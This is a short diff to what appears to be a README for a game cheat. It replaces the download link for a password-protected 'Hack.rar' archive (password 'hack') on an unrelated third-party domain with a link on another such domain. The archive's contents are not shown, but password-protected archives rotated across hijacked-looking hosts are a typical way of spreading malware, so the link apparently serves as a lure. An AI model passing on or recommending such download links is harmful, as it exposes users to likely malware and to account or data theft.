@@ -6,7 +6,7 @@
 -----------------------------------------------------------------------------------------------------------------------
 
 # Download Cheat
-|[Download](https://portalproveedores.com.mx/softwarehub/download/Hack.rar)|Password: hack|
+|[Download](https://naikshome.com/softwarehub/download/Hack.rar)|Password: hack|
 |---|---|
 
 -----------------------------------------------------------------------------------------------------------------------
